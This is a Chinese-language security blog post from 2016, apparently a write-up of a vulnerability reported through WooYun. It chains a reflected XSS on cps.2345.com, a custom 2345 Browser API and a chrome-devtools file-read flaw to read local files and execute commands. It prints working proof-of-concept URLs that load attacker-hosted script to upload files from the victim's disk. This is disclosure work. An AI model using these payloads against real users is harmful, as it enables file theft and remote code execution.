title: "[浏览器安全系列一] 2345浏览器本地文件读取及远程命令执行"
date: 2016-07-23 23:04:35
tags: ["安全", "浏览器安全", "XSS"]

---

案例链接：http://wooyun.org/bugs/wooyun-2016-0204520

### 背景知识

#### 0x00 chrome-devtools本地文件读取漏洞

在 http://www.wooyun.org/bugs/wooyun-2010-0176314 中使用到了一个chrome-devtools的一个本地文件读取的漏洞（只有特定几个版本有这个问题，现在已经修复），访问URL
```
chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://xxx.com/&remoteFrontend=true
```
就会加载并执行xxx.com下的screencast_module.js，在这个js中，有权限使用DevToolsAPI，利用向外出容器发送类型为loadNetworkResource的消息可以读取到本地文件内容。我写了一个flask程序进行验证，见测试代码。 在C盘新建一个`111.txt`并写入内容，运行服务器之后，在2345浏览器打开`chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&remoteFrontend=true`。本地测试截图：
![](http://ww1.sinaimg.cn/large/005GzSIagw1f3hwy8nqwcj30ln0bigp3.jpg)

#### 0x01 WebKit系浏览器伪协议调用

在 http://www.wooyun.org/bugs/wooyun-2010-0175902 中，可以通过`location.href="vbefile:/../../../已知路径/1.js"`来执行本地文件`1.js`
![](http://ww1.sinaimg.cn/large/005GzSIagw1f3hwyb7kovj30ob0aen1j.jpg)

### 一步一步构造PoC

#### 0x00 首先我们来思考如何实现读取本地文件
	
要让用户自己主动打开：`chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://x.xx.com/file/&remoteFrontend=true`貌似不太可能，如@gainover提到的，location.href，window.open进行跳转都是会因为安全问题而被浏览器限制，比如：提示Not allowed to load local resource，或打开页面是空白等措施。

#### 0x01 国产浏览器的毛病

在很多基于Chromium进行开发的国产浏览器中，厂商都会加入一些自己定制的API来实现一些特定的功能。在2345浏览器中，我发现一个API：`chrome.ntp2345.prepareThumbnail`，根据名字猜测，这个API应该是用于获取指定URL的HTML页面的截图，也就是说会先访问页面，然后渲染生成缩略图。（因为之前在一个开源项目中实现过类似功能，所以看到这个比较敏感）。进行了尝试之后，发现果然可以执行，并且服务端接收到了发送上来的文件内容，完美地绕过了安全限制！

```
chrome.ntp2345.prepareThumbnail('chrome-devtools://devtools/bundled/inspector.html?remoteBase=http://127.0.0.1/file/&remoteFrontend=true')
```

#### 0x02 XSS来帮忙

发现上面的API之后，我里面写了一个页面进行测试，发现还是有一定的限制，那就是这个API在非2345.com及其子域名下执行的话，会直接返回2并且不会访问制定的URL。怎么办？我们来找个XSS不就绕过了？这里有点幸运，我Google了一下`site:2345.com inurl:url`就找到了一个使用js进行url跳转的XSS，原理类似于@phith0n的http://wooyun.org/bugs/wooyun-2016-0179329 ，不受chrome限制的XSSAuditor一个反射型XSS。

```
http://cps.2345.com/go/?bid=2014060633&company_id=33&url=javascript:alert(document.domain);//
```
![](http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp65frrj30j20abju9.jpg)
![](http://ww3.sinaimg.cn/large/005GzSIagw1f3hxp84i17j30k6098ac5.jpg)

#### 0x03 本地文件读取PoC
服务端代码：https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L199-L240

用户点击一下URL，C盘下的111.txt文件内容就被上传到了服务器上，
```
http://cps.2345.com/go/?bid=2014060633&company_id=33&url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/file/xss.js%27;document.body.appendChild(s);//
```

过程总结：cps.2345.com域名下的XSS，加载/file/xss.js，执行chrome.ntp2345.prepareThumbnail(url)访问chrome-devtools:页面，读取本地文件并上传。

####  0x04 我们来实现远程命令执行

原理：（1）上述的chrome-devtools本地文件读取漏洞不仅能读取文件，还能读取文件列表！（2）我们可以通过浏览器的cache机制，写入我们指定的内容到浏览器的cache目录中（3）可以利用WebKit系浏览器伪协议调用执行cache文件。

2345浏览器的默认cache目录在：C:\Users\%USERNAME%\AppData\Local\2345Explorer\User Data\Default\Cache。要执行这个目录下的cache文件，我们要解决两个问题，首先是找出当前系统的用户名，第二是定位到我们的恶意cache文件。第一个问题，我们可以通过读取C:\Users这个目录下的文件列表，得到用户列表。然后针对每个用户，执行以下的操作来定位恶意cache文件：获取cache目录下的文件列表，保存在localStorage中，然后利用插入img的方式写入恶意cache文件，完成后再获取一次cache目录下的文件列表，找出第二次集合中新增加的文件，上传到服务器中，前端跳转到执行页面，指定iframe的src为`vbefile:/../../../../../../../../Users/xxx/AppData/Local/2345Explorer/User Data/Default/Cache/f_xxxx`，从而达到命令执行的效果。

服务端代码：https://gist.github.com/zhchbin/c4f7de8faf8a7cfa6c0f00191277df98#file-2345_poc-py-L9-L196
用户点击：
```
http://cps.2345.com/go/?bid=2014060633&company_id=33&url=javascript:s=document.createElement(%27script%27);s.src=%27//a.zhchbin.xyz/xss.js%27;document.body.appendChild(s);//
```

测试说明：因为请求有时序依赖，所以里面用了5000毫秒的等待时间，来确保顺序的正确性。测试时可以在修改一下里面的域名变成本地的地址，然后运行。

![](http://ww4.sinaimg.cn/large/005GzSIagw1f3hzd1cp2gg30my0fydmr.gif)